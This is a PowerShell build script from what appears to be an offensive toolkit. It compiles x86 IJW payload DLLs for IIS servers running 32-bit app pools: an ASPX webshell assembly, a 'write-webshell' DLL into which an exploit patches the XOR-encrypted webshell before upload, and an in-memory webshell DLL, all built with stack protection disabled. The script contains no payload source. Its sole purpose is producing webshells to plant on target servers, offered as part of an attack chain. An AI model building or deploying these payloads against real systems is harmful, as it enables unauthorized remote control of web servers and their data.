# compile_x86.ps1 -- build both IJW payload DLLs (x86) from source.
# Use when the target IIS app pool has "Enable 32-Bit Applications" set to True.
# Run from the ijw-dll-payload directory on a Windows x64 machine (the x86 tools
# are the Hostx64\x86 cross-compiler).
#
# The build environment is resolved by build-env.ps1, which detects an existing
# install and installs any missing component automatically.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$payloadDir = Split-Path -Parent $MyInvocation.MyCommand.Path
. (Join-Path $payloadDir "build-env.ps1")

$tools    = Initialize-BuildEnv -Arch "x86" -ScriptDir $payloadDir
$dotnetFx = $tools.DotnetFx

$clFlags   = @("/c", "/GS-", "/nologo", "/TP", "/clr", "/EHa", "/AI", $dotnetFx)
$linkFlags = @("/DLL", "/CLRIMAGETYPE:IJW", "/NOLOGO", "/MACHINE:X86",
               "kernel32.lib", "mscoree.lib", "oleaut32.lib")

# ---- aspx-stub (AnyCPU managed assembly) -----------------------------------
# webshell.dll is AnyCPU -- the exploit XOR-encrypts this and patches it into
# payload_write.dll before upload. Compiled once here; architecture-neutral.

Write-Host ""
Write-Host "[*] Building aspx-stub (AnyCPU) ..."
Push-Location (Join-Path $payloadDir "write-webshell\aspx-stub")
try {
    & $tools.Csc /nologo /target:library /r:"$dotnetFx\System.Web.dll" /out:webshell.dll webshell.cs
    if ($LASTEXITCODE -ne 0) { throw "csc.exe failed for aspx-stub" }

    Write-Host "[+] write-webshell\aspx-stub\webshell.dll"
    Get-Item webshell.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

# ---- write-webshell --------------------------------------------------------

Write-Host ""
Write-Host "[*] Building write-webshell (x86) ..."
Push-Location (Join-Path $payloadDir "write-webshell")
try {
    & $tools.Cl @clFlags payload_write.c
    if ($LASTEXITCODE -ne 0) { throw "cl.exe failed for write-webshell" }

    & $tools.Link @linkFlags /out:payload_write_x86.dll payload_write.obj
    if ($LASTEXITCODE -ne 0) { throw "link.exe failed for write-webshell" }

    Write-Host "[+] write-webshell\payload_write_x86.dll"
    Get-Item payload_write_x86.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

# ---- inmemory-webshell -----------------------------------------------------

Write-Host ""
Write-Host "[*] Building inmemory-webshell (x86) ..."
Push-Location (Join-Path $payloadDir "inmemory-webshell")
try {
    & $tools.Cl @clFlags payload_inmemory.c
    if ($LASTEXITCODE -ne 0) { throw "cl.exe failed for inmemory-webshell" }

    & $tools.Link @linkFlags /out:payload_inmemory_x86.dll payload_inmemory.obj
    if ($LASTEXITCODE -ne 0) { throw "link.exe failed for inmemory-webshell" }

    Write-Host "[+] inmemory-webshell\payload_inmemory_x86.dll"
    Get-Item payload_inmemory_x86.dll | Select-Object Name, Length, LastWriteTime
} finally {
    Pop-Location
}

Write-Host ""
Write-Host "[+] All x86 payloads built."
